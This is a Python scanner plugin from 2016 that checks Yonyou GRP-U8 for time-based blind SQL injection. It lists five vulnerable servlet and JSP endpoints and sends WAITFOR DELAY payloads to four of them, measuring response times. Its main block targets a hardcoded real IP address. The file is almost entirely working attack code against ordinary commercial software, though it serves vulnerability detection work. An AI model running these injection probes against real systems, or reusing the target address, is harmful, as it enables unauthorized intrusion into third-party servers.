#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 用友 GRP-u8 四处sql注入打包  

#Refer:http://www.wooyun.org/bugs/wooyun-2010-0108912
#Refer:http://www.wooyun.org/bugs/wooyun-2010-091294  
#Data:2016/1/27  

import time
''' 
/IMLoginServlet?pwd=1&uid=1 uid 参数sql注入   字符型注入
/persionTreeServlet?bmdm=1   bmdm 参数sql注入  字符型注入
/R9iPortal/cm/cm_info_list.jsp?itype_id=3  itype_id参数sql注入  整型注入  
/R9iPortal/cm/cm_info_content.jsp?info_id=82  info_id参数sql注入  整型注入 
/R9iPortal/cm/cm_notice_content.jsp?info_id=4  info_id 参数sql注入  整型注入  

'''

def assign(service,arg):
    if service=="yongyou_u8":
        return True,arg

def audit(arg):
    vun_urls=['IMLoginServlet?pwd=1&uid=1(str)',
              'persionTreeServlet?bmdm=1(str)',
              'R9iPortal/cm/cm_info_list.jsp?itype_id=3(int)',
              'R9iPortal/cm/cm_notice_content.jsp?info_id=4(int)']
    payload_0=";WAITFOR%20DELAY%20%270:0:0%27--"
    payload_1=";WAITFOR%20DELAY%20%270:0:5%27--"
    for vun_url in vun_urls:
        if vun_url[-5:]=="(int)":
            payload0=payload_0
            payload1=payload_1
        else:
            payload0="%27"+payload_0
            payload1="%27"+payload_1
        #proxy=('127.0.0.1',8080)
        time0=time.time()
        code1,head,res,errcode,finalurl=curl.curl2(arg+vun_url[:-5]+payload1)
        time1=time.time()
        code2,head,res,errcode,finalurl=curl.curl2(arg+vun_url[:-5]+payload0)
        time2=time.time()
        if code1!=0 and code2!=0 and ((time1-time0)-(time2-time1))>4:
            security_hole("sql inject: "+arg+vun_url)
            
if __name__=="__main__":
    from dummy import  *
    audit(assign('yongyou_u8','http://61.139.105.105:8008/')[1])